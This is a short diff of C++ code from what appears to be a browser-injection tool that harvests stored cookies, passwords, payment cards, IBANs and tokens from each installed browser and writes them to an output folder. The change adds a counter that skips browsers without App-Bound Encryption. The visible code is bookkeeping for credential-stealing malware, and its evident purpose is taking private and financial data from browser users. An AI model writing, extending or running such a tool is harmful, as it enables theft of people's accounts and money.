@@ -16,6 +16,7 @@ using namespace Injector;
 struct GlobalStats {
     int successful = 0;
     int failed = 0;
+    int skipped = 0;
 };
 
 void ProcessBrowser(const BrowserInfo& browser, bool verbose, bool fingerprint, bool killFirst,
@@ -66,7 +67,10 @@ void ProcessBrowser(const BrowserInfo& browser, bool verbose, bool fingerprint, 
         pipe.ProcessMessages(verbose);
         
         auto pStats = pipe.GetStats();
-        if (pStats.cookies > 0 || pStats.passwords > 0 || pStats.cards > 0 || pStats.ibans > 0 || pStats.tokens > 0) {
+        if (pStats.noAbe) {
+            // ABE not enabled - not a failure, just skip
+            stats.skipped++;
+        } else if (pStats.cookies > 0 || pStats.passwords > 0 || pStats.cards > 0 || pStats.ibans > 0 || pStats.tokens > 0) {
             console.Summary(pStats.cookies, pStats.passwords, pStats.cards, pStats.ibans, pStats.tokens,
                            pStats.profiles, (output / browser.displayName).string());
             stats.successful++;
